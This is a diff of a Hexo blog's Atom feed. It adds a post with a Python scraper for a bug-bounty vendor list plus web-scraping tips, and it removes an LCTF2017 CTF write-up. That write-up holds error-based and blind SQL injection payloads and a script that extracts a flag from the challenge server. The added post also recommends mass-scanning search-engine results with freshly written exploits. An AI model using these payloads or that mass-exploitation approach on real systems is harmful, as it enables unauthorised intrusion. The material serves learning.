@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2018-03-21T17:22:59.028Z</updated>
+  <updated>2018-04-17T09:28:12.805Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>python爬取补天src列表</title>
+    <link href="http://yoursite.com/2018/04/17/butianspider/"/>
+    <id>http://yoursite.com/2018/04/17/butianspider/</id>
+    <published>2018-04-17T09:28:12.804Z</published>
+    <updated>2018-04-17T09:28:12.805Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="用python爬取补天src列表"><a href="#用python爬取补天src列表" class="headerlink" title="用python爬取补天src列表"></a>用python爬取补天src列表</h1><p><strong>分享一个我写的代码，用python爬取补天src列表，同时可以爬取网站域名和漏洞的提交数和处理数，以公益src为例，贴出我写的代码</strong></p><pre><code># -*- coding: utf-8 -*-import requestsfrom bs4 import BeautifulSoupurl=&quot;http://loudong.360.cn/Reward/pub&quot;for pnum in range(1,160):    r=requests.post(url=url,data={&apos;s&apos;:1,&apos;p&apos;:pnum}).json()    for info in r[&quot;data&quot;][&quot;list&quot;]:        company_name=info[&quot;company_name&quot;]        company_url=&quot;http://loudong.360.cn/Company/&quot;+info[&quot;company_id&quot;]        html=requests.get(url=company_url).content        soup=BeautifulSoup(html,&quot;lxml&quot;)        num=soup.find_all(class_=&quot;spp&quot;)        print &quot;漏洞数:&quot;,num[0].string,&quot;已处理:&quot;,num[1].string        surl=&quot;http://loudong.360.cn/Loo/submit?cid=&quot;+info[&quot;company_id&quot;]        headers={&quot;Cookie&quot;:&quot;你登陆后的cookie&quot;}        html=requests.get(url=surl,headers=headers).content        soup=BeautifulSoup(html,&quot;lxml&quot;)        site=soup.find(&quot;input&quot;,attrs={&quot;placeholder&quot;:&quot;请输入厂商域名&quot;})[&quot;value&quot;]        print company_name        print site        print u&quot;漏洞数:&quot;, num[0].string, u&quot;已处理:&quot;, num[1].string        print &quot;-------------------------------------------------------------------------------------------------&quot;</code></pre><p><strong>爬取时需要用到的库</strong></p><pre><code>requests库和bs4库</code></pre><p><strong>补天还是十分好爬的，只要分析好每次请求和响应，爬下关键请求的页面，用bs4的BeautifulSoup解析提取数据即可</strong></p><p><strong>关于BeautifulSoup，自己写代码很喜欢用，提取数据很方便，<a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc.zh/" title="官方文档" target="_blank" rel="external">官方文档</a>写的非常详细</strong></p><p><strong>运行结果</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180417/94aIlf0B6K.png?imageslim" alt="mark"></p><h3 id="分享我写爬虫的一些经验"><a href="#分享我写爬虫的一些经验" class="headerlink" title="分享我写爬虫的一些经验"></a>分享我写爬虫的一些经验</h3><p><strong>最后总结一下我多次写爬虫所总结的经验和方法，爬取网页数据通用的一些方法</strong></p><p><strong>request库常用总结</strong></p><pre><code>html=requests.get(url=url,params={params},headers={headers},cookies={cookies},proxies={proxies}).content用于http GET方法请求的页面，需要提交参数时可以直接在url的?后加参数，也可以将GET请求参数以字典的数据类型赋值给request库get方法中params参数进行提交参数作用:params:字典数据类型，存放http请求的GET参数headers：字典数据类型，里面内容为http的一些请求头，比如Host，User-Agent，主要用来突破一些网站的防爬机制，cookie值也能放到这个里面cookies:字典数据类型,用来存放cookie值proxies：字典数据类型,爬取页面所需要设置的代理，比如爬取谷歌和一些国外网站，因为国内被墙了，搭了ss才能访问，但是直接用python请求页面还是不行，这时候就需要在这里进行设置了，我一般是这样设置的,因为我ss客户端设在了本地1088端口:proxies={&quot;http&quot;:&quot;http://127.0.0.1:1088&quot;,&quot;https&quot;:&quot;https://127.0.0.1:1088&quot;}html=requests.post(url=url,data={data},headers={headers},cookies={cookies},proxies={proxies}).content用于http POST方法请求的页面data:字典数据类型，POST提交的参数headers，cookie，proxies:均和上述的作用一致</code></pre><p><strong>re库常用总结</strong></p><pre><code>p=re.compile(r&quot;编写的正则表达式&quot;)用来编译正则表达式对象并且返回一个正则表达式对象list=p.findall(页面)匹配页面中和正则表达式匹配的数据并且将所有结果以列表的形式返回关于正则表达式，需要多加练习，每个人都有不一样的编写正则方法，只要能将需要的数据精确完整匹配出来的方法都是好方法，特别需要注意贪婪匹配和非贪婪匹配的区别和用法(.*?|.*+)</code></pre><p><strong>bs4库的BeautifulSoup常用总结</strong></p><pre><code>使用BeautifulSoup提取数据，首先要了解html DOM格式:简单来说就是，&lt;标签 属性=&quot;属性值&quot;&gt;文本&lt;/标签&gt;from bs4 import BeautifulSoupsoup=BeautifulSoup(html,&quot;lxml&quot;)返回一个BeautifulSoup对象，我一般比较喜欢用lxml格式解析页面，用多了自然就成习惯了list=soup.find_all(html标签属性=属性值)寻找html所有匹配&quot;html标签属性=属性值&quot;的html标签并以列表的形式返回，列表中每个值的类型均为BeautifulSoup对象for i in list:    i[&quot;属性&quot;]用来提取某一属性下的属性值    i.string用来提取html标签中的文本</code></pre><p><strong>urllib库常用总结</strong></p><pre><code>urllib.urlretrieve(url,filename)urllib库的urlretrieve方法主要用来下载文件，通常将页面爬下来后，用正则表达式或者BeautifulSoup将jpg，png一些图片，xls，doc一些文档，或者mp4等视频连接爬下来后，一般都需要用这个库下载url:资源的链接filename：文件存放的位置，我一般这样写，filename=yourfilepath+url.split(&apos;/&apos;)[-1],比较方便</code></pre><h3 id="我对写爬虫的看法"><a href="#我对写爬虫的看法" class="headerlink" title="我对写爬虫的看法"></a>我对写爬虫的看法</h3><p><strong>以上总结了我写代码的一些方法经验，我对编程的看法是：其实每个人写代码的方式都不太一样，代码写的多了就会有自己的风格。代码主要还是为了解决需求，节省人力，能够将代码用到自己的生活或者工作中，是件很有意思的事情，我觉得写python代码的要点有几个:要多动手写，看官方文档的效率比看书高，编程书是用来查的，百度谷歌很强大</strong></p><h3 id="python爬虫能力对安全人员的作用"><a href="#python爬虫能力对安全人员的作用" class="headerlink" title="python爬虫能力对安全人员的作用"></a>python爬虫能力对安全人员的作用</h3><p><strong>开发简单的漏扫工具，需要爬虫的基础</strong></p><p><strong>根据漏洞编写exp，新爆出的漏洞，exp早写出来可以多刷些漏洞</strong></p><p><strong>*利用搜素引擎批量刷漏洞，对于新爆出的漏洞，编写exp后结合搜索引擎的语法寻找网络空间中的漏洞相关组件去测试，整个过程都可以用python爬虫技术自动化完成</strong></p><h3 id="官方文档链接"><a href="#官方文档链接" class="headerlink" title="官方文档链接"></a>官方文档链接</h3><p><strong><a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc.zh/" title="BeautifulSoup官方文档" target="_blank" rel="external">BeautifulSoup官方文档</a></strong></p><p><strong><a href="http://docs.python-requests.org/zh_CN/latest/" title="requests官方文档" target="_blank" rel="external">requests官方文档</a></strong></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;用python爬取补天src列表&quot;&gt;&lt;a href=&quot;#用python爬取补天src列表&quot; class=&quot;headerlink&quot; title=&quot;用python爬取补天src列表&quot;&gt;&lt;/a&gt;用python爬取补天src列表&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;分享一个我写
+      
+    
+    </summary>
+    
+      <category term="python爬虫挑战" scheme="http://yoursite.com/categories/python%E7%88%AC%E8%99%AB%E6%8C%91%E6%88%98/"/>
+    
+    
+      <category term="人生苦短，我用python" scheme="http://yoursite.com/tags/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8C%E6%88%91%E7%94%A8python/"/>
+    
+  </entry>
   
   <entry>
     <title>Ettercap实现局域网dns劫持</title>
@@ -488,31 +513,6 @@
     
     
       <category term="漏洞利用" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>通过lctf2017 writeup get思路</title>
-    <link href="http://yoursite.com/2017/11/20/lctf2017/"/>
-    <id>http://yoursite.com/2017/11/20/lctf2017/</id>
-    <published>2017-11-20T09:09:32.344Z</published>
-    <updated>2017-11-20T13:30:27.085Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="通过lctf2017-writeup-get到的姿势"><a href="#通过lctf2017-writeup-get到的姿势" class="headerlink" title="通过lctf2017 writeup get到的姿势"></a>通过lctf2017 writeup get到的姿势</h1><p><strong>偶然在群里看到别人发的lctf2017 writeup,这个比赛自己没做,不过看了这篇writeup后照着思路做了一下题,学到了不少新的思路和姿势,激动万分</strong></p><p><strong><a href="https://mp.weixin.qq.com/s?srcid=11203xrbPM3MfT5t21QgBaj8&amp;scene=23&amp;mid=2247484338&amp;sn=33dc65055c9e00ce487f89c4c1ff4098&amp;idx=1&amp;__biz=MzIzMTc1MjExOQ%3D%3D&amp;chksm=e89e2b6adfe9a27c02fc3235f319f295871fac1dd2dc3490362d644493643664cd13643ba0f9&amp;mpshare=1#rd" title="原文链接" target="_blank" rel="external">原文链接</a></strong></p><p><strong>url:<a href="http://182.254.246.93/entrance.php" title="http://182.254.246.93/entrance.php" target="_blank" rel="external">http://182.254.246.93/entrance.php</a></strong></p><p><strong>这道题的思路首先是根据源代码中的提示判断这是一道注入题,注入点在pro_id上</strong></p><pre><code>&lt;form method =&quot;POST&quot; action=&quot;entrance.php&quot;&gt;  &lt;p&gt;Do you want to know their secrets?&lt;/p&gt;&lt;p&gt;id:&lt;input id=&quot;pro_id&quot; name=&quot;pro_id&quot; type=&quot;text&quot; /&gt;&lt;/p&gt;&lt;p&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/p&gt;&lt;/form&gt; &lt;!-- Tip:将表的某一个字段名，和表中某一个表值进行字符串连接，就可以得到下一个入口喽~ --&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>根据提示进行union查询,发现一些关键字被waf拦截了,过滤的关键字有<code>database()</code>,<code>version()</code>,<code>information_schema</code>等,然而很多注入都是基于<code>information_schema</code>这个数据库的,但是通过上面那篇pcat的文章,我学习到了新的姿势</strong></p><p><strong>先在post参数pro_id上进行order by判断列数,发现当前数据表列数为4,然后构造payload</strong></p><pre><code>pro_id=1 union select 1,2,3,4 from test</code></pre><p><strong>由于test表不存在,于是会爆出错误,错误中出现当前数据库的名字</strong></p><pre><code>Table &apos;youcanneverfindme17.test&apos; doesn&apos;t exist</code></pre><p><strong>发现可以报错后,尝试用报错函数得到更多的数据,发现updatexml,extractvalue等XPATH报错函数对参数类型进行了严格的控制均不能使用,会出现<code>Only constant XPATH queries are supported</code>的提示,那么构造payload</strong></p><pre><code>pro_id=1 and exp(~(select pro_id))</code></pre><p><strong>通过一个整数溢出的错误报出当前数据库的名字和表名,列名pro_id是通过post参数猜测出来的</strong></p><pre><code>DOUBLE value is out of range in &apos;exp(~((select `youcanneverfindme17`.`product_2017ctf`.`pro_id`)))&apos;</code></pre><p><strong>接下来是爆出表下的列名,构造payload</strong></p><pre><code>pro_id=0 and (select * from (select * from youcanneverfindme17.product_2017ctf a join youcanneverfindme17.product_2017ctf b using(pro_id))c)</code></pre><p><strong>这条语句通过pro_id字段连接两个相同的表,将会产生相同的列名,由于一个数据表不能有相同的列名,就会爆出<code>Duplicate column name</code>的错误，同时爆出列的名字,所以我们通过对一个不符合要求的表进行子查询,就会报错</strong></p><pre><code>Duplicate column name &apos;pro_name&apos;</code></pre><p><strong>我们可以通过报出的错误信息遍历列名,payload</strong></p><pre><code>pro_id=0 and (select * from (select * from youcanneverfindme17.product_2017ctf a join youcanneverfindme17.product_2017ctf b using(pro_id,pro_name))c)</code></pre><p><strong>继续报错</strong></p><pre><code>Duplicate column name &apos;owner&apos;</code></pre><p><strong>构造payload遍历</strong></p><pre><code>pro_id=0 and (select * from (select * from youcanneverfindme17.product_2017ctf a join youcanneverfindme17.product_2017ctf b using(pro_id,pro_name,owner))c)</code></pre><p><strong>回显出了和提示中符合的列名</strong></p><pre><code>Duplicate column name &apos;d067a0fa9dc61a6e&apos;</code></pre><p><strong>但是从product_2017ctf表中对d067a0fa9dc61a6e字段内容进行union查询时发现d067a0fa9dc61a6e也被waf过滤了,从上篇文章中自己学到了一个很有意思的姿势,方法是盲注,pro_id=3的product name和题目连接的名字很相似,都为entrance,那么我们可以猜测flag的后半部分在pro_id为3的记录中,,因为d067a0fa9dc61a6e列为第四列,我们要提取他当中的内容,可以用<code>union select 1，2，3，字符串</code>进行盲注,通过order by desc降序,由于mysql比较字符串大小是根据字符ascii码比较的,所以如果我们的字符串的ascii码的值小于flag的ascii值,union查询的第一条记录便为union关键字前的查询结果,否则就会显示<code>select 1,2,3,字符串</code>的结果,也就是显示2(显示位在2上),所以通过显示结果的不同可以进行盲注,编写脚本</strong></p><pre><code>import requestsimport stringurl=&quot;http://182.254.246.93/entrance.php&quot;list=string.maketrans(&quot;&quot;,&quot;&quot;)[33:127]flaghead=&quot;d067a0fa9dc61a6e&quot;flagtail=&quot;&quot;while 1:for i in list:    payload={&quot;pro_id&quot;:&quot;3 union select 1,2,3,%s order by 4 desc&quot;%(&quot;0x&quot;+(flagtail+i).encode(&quot;hex&quot;))}    html=requests.post(url=url,data=payload).content    if html.find(&quot;nextentrance&quot;)==-1:        flagtail+=chr(ord(i)-1)        print flagtail        l2=len(flagtail)        break    else:        passif flagtail.split(&quot;.&quot;)[-1]==&quot;PHP&quot;:    breakflag=flaghead+flagtail.lower()print flag</code></pre><p><strong>得出flag</strong></p><pre><code>C:\Users\I&apos;m possible\Desktop&gt;getflag.py77171971957195C7195CA7195CA97195CA997195CA9967195CA99697195CA996967195CA99696B7195CA99696B57195CA99696B5A7195CA99696B5A87195CA99696B5A897195CA99696B5A8967195CA99696B5A896.7195CA99696B5A896.P7195CA99696B5A896.PH7195CA99696B5A896.PHPd067a0fa9dc61a6e7195ca99696b5a896.php</code></pre><p><strong>flag为下一关地址</strong></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;通过lctf2017-writeup-get到的姿势&quot;&gt;&lt;a href=&quot;#通过lctf2017-writeup-get到的姿势&quot; class=&quot;headerlink&quot; title=&quot;通过lctf2017 writeup get到的姿势&quot;&gt;&lt;/a&gt;通过lctf20
-      
-    
-    </summary>
-    
-      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="ctf" scheme="http://yoursite.com/tags/ctf/"/>
     
   </entry>
   
